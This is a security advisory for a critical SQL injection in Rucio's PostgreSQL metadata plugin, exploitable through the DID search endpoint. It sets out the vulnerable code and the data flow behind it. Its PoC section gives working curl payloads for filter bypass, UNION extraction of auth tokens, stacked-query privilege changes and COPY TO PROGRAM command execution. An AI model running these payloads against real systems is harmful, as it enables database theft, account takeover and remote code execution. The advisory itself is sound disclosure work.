# [C] Rucio has SQL Injection in FilterEngine PostgreSQL Query Builder via DID Search API

## Summary
Severity: Critical
Advisory: GHSA-6j7p-qjhg-9947
CVE: CVE-2026-29090
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-6j7p-qjhg-9947
Type: github-advisory

## Affected
- PyPI: `rucio` — affected >=1.30.0 <35.8.5
- PyPI: `rucio` — affected >=36.0.0 <38.5.5
- PyPI: `rucio` — affected >=39.0.0 <39.4.2
- PyPI: `rucio` — affected >=40.0.0 <40.1.1

## Details
### Summary

A SQL injection vulnerability in `FilterEngine.create_postgres_query` allows any authenticated Rucio user to execute arbitrary SQL against the configured PostgreSQL metadata database through the DID search endpoint (`GET /dids/<scope>/dids/search`). When the external metadata plugin `postgres_meta` is configured, attacker-controlled filter keys and values are interpolated directly into raw SQL statements via Python `str.format`. This enables full database compromise including data exfiltration, data modification, and potential remote code execution via `COPY ... FROM PROGRAM`.

---

### Details

The vulnerability exists in `lib/rucio/core/did_meta_plugins/filter_engine.py` within the `create_postgres_query()` method (lines 408-484). This method builds raw SQL strings via Python `.format()` across 6 distinct injection points:

**filter_engine.py:477** (string equality — default branch):
```python
expression = "{}->>'{}'  {} '{}'".format(jsonb_column, key, POSTGRES_OP_MAP[oper], value)
```

**filter_engine.py:442** (wildcard/LIKE branch):
```python
expression = "{}->>'{}'  LIKE '{}' ".format(jsonb_column, key, value.replace('*', '%'))
```

**filter_engine.py:456** (boolean branch — value unquoted):
```python
expression = "({}->>'{}'  )::boolean {} {}".format(jsonb_column, key, POSTGRES_OP_MAP[oper], value)
```

**filter_engine.py:462** (numeric branch — value unquoted):
```python
expression = "({}->>'{}'  )::float {} {}".format(jsonb_column, key, POSTGRES_OP_MAP[oper], value)
```

**filter_engine.py:472** (datetime branch):
```python
expression = "({}->>'{}'  )::timestamp {} '{}'".format(jsonb_column, key, POSTGRES_OP_MAP[oper], value)
```

**filter_engine.py:479** (non-JSONB column fallback):
```python
expression = "{} {} '{}'".format(key, POSTGRES_OP_MAP[oper], value)
```

Both `key` and `value` are attacker-controlled strings derived from HTTP query parameters. The resulting `expression` string is concatenated into a larger query string (`postgres_query_str`) that is then passed to `psycopg3`'s `sql.SQL()`:

```python
# postgres_meta.py:314-316
statement = sql.SQL("SELECT * FROM {} WHERE {} {}").format(
    sql.Identifier(self.table),
    sql.SQL(postgres_query_str),   # <-- UNSANITIZED user-derived string
    sql.SQL("LIMIT {}").format(sql.Literal(limit)) if limit else sql.SQL("")
)
```

`sql.SQL()` wraps the string as a trusted SQL syntax fragment — it does **not** escape or parameterize its contents. The statement is then executed via `cur.execute(statement)` at `postgres_meta.py:321`.

#### Why no existing defense blocks this

The data flow from HTTP request to SQL execution passes through multiple layers with no effective sanitization:

1. **HTTP input** (`dids.py:265-274`): Filter keys and values are accepted from query parameters via `ast.literal_eval()` or directly from individual query argument names/values. The fallback path only excludes 4 reserved keys (`type`, `limit`, `long`, `recursive`).

2. **Plugin routing** (`did_meta_plugins/__init__.py:227-248`): Each filter key is checked via `manages_key()`. `postgres_meta.manages_key()` **unconditionally returns `True`** (line 345) — it accepts ANY filter key without validation.

3. **FilterEngine initialization**: The `postgres_meta` plugin instantiates `FilterEngine` with `strict_coerce=False`. Unknown keys pass through `_coerce_filter_word_to_model_attribute()` as raw strings.

4. **Value typecasting** (`filter_engine.py:275-297`): `_try_typecast_string()` attempts to parse the value as a boolean, datetime, or number. SQL injection strings fail all these parsers and are returned unchanged.

5. **Sanity checks** (`filter_engine.py:149-190`): `_sanity_check_translated_filters()` does **not** validate arbitrary key names or values for SQL-unsafe characters.

6. **SQL construction** (`filter_engine.py:442-479`): The unsanitized key and value strings are interpolated directly into raw SQL strings via `.format()`.

7. **SQL execution** (`postgres_meta.py:316,321`): The raw string is wrapped in `sql.SQL()` (treated as trusted SQL) and executed via `cur.execute()`.

---

### PoC

**Prerequisites:**
- A Rucio instance using PostgreSQL as the database backend
- The `postgres_meta` metadata plugin **explicitly configured** (this is NOT the default — the default is `json_meta`)
- Any valid Rucio authentication token (obtainable via userpass, x509, OIDC, SAML, SSH, or GSS)

#### 1. Obtain an authentication token

```bash
TOKEN=$(curl -s -k \
  -H 'X-Rucio-Account: testuser' \
  -H 'X-Rucio-Username: testuser' \
  -H 'X-Rucio-Password: testpass' \
  'https://rucio.example.org/auth/userpass' \
  -D - 2>/dev/null | grep -i 'x-rucio-auth-token' | awk '{print $2}' | tr -d '\r')
```

#### 2. Value injection — boolean-based filter bypass

```bash
# postgres_meta uses create_postgres_query() -> raw string formatting
# filter_engine.py:477: "{}->>'{}'  {} '{}'".format(jsonb_column, key, op, value)

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  "https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x'%20OR%20'1'%3D'1"

# URL-decoded: custom_key=x' OR '1'='1
#
# Generated SQL fragment:
#   data->>'custom_key' = 'x' OR '1'='1'
#
# Effect: WHERE clause always true, returns all rows
```

#### 3. Key injection via query parameter name

```bash
# The key is single-quoted but unescaped — injection via closing quote.
# filter_engine.py:477: "{}->>'{}'  {} '{}'".format(jsonb_column, key, op, value)

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  "https://rucio.example.org/dids/user.testuser/dids/search?x'%20OR%201%3D1--%20=anything"

# URL-decoded: key = x' OR 1=1--  , value = anything
#
# Generated SQL fragment:
#   data->>'x' OR 1=1-- ' = 'anything'
#              ^^^^^^^^ injected, -- comments out the rest
```

#### 4. UNION-based data extraction

```bash
# Extract auth tokens from the tokens table.

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  "https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x'%20UNION%20SELECT%20token%2Caccount%2CNULL%2CNULL%20FROM%20tokens%20--"

# URL-decoded: custom_key=x' UNION SELECT token,account,NULL,NULL FROM tokens --
#
# Effect: Appends tokens table contents to the result set
```

#### 5. Stacked queries — data modification

```bash
# PostgreSQL supports multiple statements separated by ;

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  "https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x';%20UPDATE%20accounts%20SET%20account_type%3D'SERVICE'%20WHERE%20account%3D'testuser';%20--"

# URL-decoded: custom_key=x'; UPDATE accounts SET account_type='SERVICE' WHERE account='testuser'; --
```

#### 6. Remote code execution (if database user has superuser privileges)

```bash
# PostgreSQL COPY ... FROM PROGRAM executes OS commands

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  "https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x';%20COPY%20(SELECT%20'')%20TO%20PROGRAM%20'id%20>%20/tmp/pwned';%20--"

# URL-decoded: custom_key=x'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'; --
# Requires: database user with pg_execute_server_program or superuser role
```

#### 7. Alternative entry via `filters` query parameter

```bash
# The filters parameter accepts Python literal syntax via ast.literal_eval().

curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  'https://rucio.example.org/dids/user.testuser/dids/search?filters=%5B%7B%22custom_key%22%3A%20%22x%27%20OR%20%271%27%3D%271%22%7D%5D'

# URL-decoded: filters=[{"custom_key": "x' OR '1'='1"}]
```

---

### Impact

**Vulnerability type:** SQL Injection (CWE-89)

**CVSS v3.1:** 9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Who is impacted:**

- Rucio deployments that have explicitly configured the `postgres_meta` metadata plugin.

**What an attacker can do:**

- **Data modification:** PostgreSQL stacked queries enable arbitrary `INSERT`/`UPDATE`/`DELETE` operations.
- **Remote code execution:** Via PostgreSQL's `COPY ... FROM PROGRAM` if the database user has superuser or `pg_execute_server_program` privileges.
- **File system access:** Via `COPY ... TO/FROM '/path'` if filesystem permissions allow.

**Further elevation when the same postgres database and access is used for metadata and for Rucio itself**

- **Full database read access:** Extract any table including `identities` (password hashes and salts), `tokens` (active authentication sessions), `accounts` (user enumeration), `rse_settings` (storage endpoint credentials), and `rules` (data management policies) could be extracted.
- **Password hash extraction:** Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.
- **Authentication token theft:** Active bearer tokens can be extracted and used for immediate session hijacking.

**Required attacker privileges:** Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The `GET /dids/<scope>/dids/search` endpoint is available to all authenticated users.

## References
- https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947
- https://nvd.nist.gov/vuln/detail/CVE-2026-29090
- https://github.com/advisories/GHSA-6j7p-qjhg-9947
- https://github.com/pypa/advisory-database/tree/main/vulns/rucio/PYSEC-2026-527.yaml
- https://github.com/rucio/rucio
- https://pypi.org/project/rucio
